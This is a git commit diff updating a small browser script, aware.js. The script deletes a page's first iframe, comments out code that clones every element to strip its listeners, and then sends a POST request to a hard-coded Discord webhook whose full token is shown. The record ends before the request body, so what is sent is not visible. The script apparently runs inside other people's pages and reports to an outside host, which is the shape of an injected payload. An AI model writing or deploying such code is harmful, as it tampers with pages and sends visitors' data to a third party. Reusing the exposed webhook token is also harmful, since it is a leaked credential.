5d690ab84cf0efe30d59a6bf2476a7e28a6ac578
Reality <63677818+Th3R3ality@users.noreply.github.com>
2024-04-21 18:51:23 +0200

    Update aware.js

--- aware.js
+++ aware.js
@@ -1,12 +1,12 @@
 var frames = document.getElementsByTagName("iframe");
-frames[0].remove();
-//frames[0].parentNode.parentNode.parentNode.remove();
+frames[0].remove(); //frames[0].parentNode.parentNode.parentNode.remove();
 
+/*
 Array.from(document.getElementsByTagName('*')).forEach(element => {
     const clone = element.cloneNode(true);
     element.parentNode.replaceChild(clone, element);
 });
-
+*/
 var xhr = new XMLHttpRequest();
 xhr.open("POST","https://discord.com/api/webhooks/881918023764697128/tEtQqj3w08JSjay5Jg4CIzijyTb2akzTosya6NVKL8Pr-gMMq33TwPwyy-wInoErm_YA", true);
 xhr.setRequestHeader("Content-Type", "application/json");
